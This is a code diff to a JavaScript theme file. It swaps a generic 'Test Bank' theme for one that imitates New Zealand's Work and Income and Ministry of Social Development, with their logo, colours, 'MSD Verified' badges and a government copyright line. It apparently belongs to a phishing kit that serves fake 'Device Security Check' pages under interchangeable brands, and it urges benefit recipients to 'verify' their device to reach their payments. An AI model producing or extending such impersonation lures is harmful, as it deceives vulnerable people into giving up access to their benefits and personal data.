@@ -32,35 +32,35 @@ window.themes = {
             }
         }
     },
-    test: {
-        name: "Test Bank",
-        logo: "./assets/test-bank-logo.png",
-        primaryColor: "#4CAF50",
-        secondaryColor: "#388E3C",
-        styles: "themes/test.css",
+    winz: {
+        name: "Work and Income NZ",
+        logo: "./assets/logo-winz.svg",
+        primaryColor: "#0066CC",
+        secondaryColor: "#004C99",
+        styles: "themes/winz.css",
         content: {
-            title: "Security Check Required",
-            message: "Your security is our priority",
-            subMessage: "As part of our enhanced security measures, we need to verify your current device before proceeding.",
-            buttonText: "Start Verification",
+            title: "Device Security Check",
+            message: "Verify your device to access your benefits",
+            subMessage: "To protect your personal information and ensure secure access to your payments and benefits, we need to verify this device.",
+            buttonText: "Verify Device",
             badges: [
-                { icon: "🛡️", text: "Enhanced Security" },
-                { icon: "📱", text: "Device Protection" }
+                { icon: "🔒", text: "Government Security" },
+                { icon: "✓", text: "MSD Verified" }
             ],
             infoBox: {
-                title: "About this verification",
+                title: "Why do we need to verify your device?",
                 points: [
-                    "Protect your account from unauthorized access",
-                    "Enhance your online banking security",
-                    "Quick and easy verification process"
+                    "Protect your benefit payments and personal details",
+                    "Ensure secure access to MyMSD",
+                    "Prevent unauthorized changes to your information"
                 ]
             },
             footer: {
-                copyright: "© 2024 Test Bank. All rights reserved.",
+                copyright: "© 2024 Ministry of Social Development. All rights reserved.",
                 links: [
-                    { text: "Privacy Policy", url: "#" },
-                    { text: "Security Center", url: "#" },
-                    { text: "Help", url: "#" }
+                    { text: "Privacy", url: "#" },
+                    { text: "Security", url: "#" },
+                    { text: "Contact Us", url: "#" }
                 ]
             }
         }
